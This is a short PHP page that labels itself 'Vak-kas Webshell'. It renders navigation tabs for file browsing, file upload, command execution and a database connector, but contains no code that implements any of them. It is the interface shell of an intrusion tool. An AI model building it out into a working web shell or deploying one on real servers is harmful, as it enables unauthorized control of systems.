<?php
    header("Content-Type: text/html; charset=UTF8");
    $mode = isset($_REQUEST["mode"]) ? $_REQUEST["mode"] : "fileBrowser";
    $page = basename($_SERVER["PHP_SELF"]);
?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <title>Vak-kas Webshell</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
</head>
<body>
<div class="container-fluid">
    <div class="row">
    <div class='col-md-3'></div>
    <div class='col-md-6'>
        <h3>Webshell <small>Create by Vak-kas</small></h3>
        <hr>
        <ul class="nav nav-tabs">
        <li role="presentation" <?php if($mode == "fileBrowser") echo 'class="active"'; ?>><a href="<?=$page?>?mode=fileBrowser">File Browser</a></li>
        <li role="presentation" <?php if($mode == "fileUpload") echo 'class="active"'; ?>><a href="<?=$page?>?mode=fileUpload">File Upload</a></li>
        <li role="presentation" <?php if($mode == "command") echo 'class="active"'; ?>><a href="<?=$page?>?mode=command">Command Execution</a></li>
        <li role="presentation" <?php if($mode == "db") echo 'class="active"'; ?>><a href="<?=$page?>?mode=db">DB Connector</a></li>
        <li role="presentation"><a href="<?=$page?>?mode=logout">Logout</a></li>
        </ul>
        <hr>
        <p class="text-muted text-center">Copyright 2025, Vkkas, All rights reserved.</p>
    </div>
    <div class='col-md-3'></div>
    </div>
</div>
    
</body>
</html>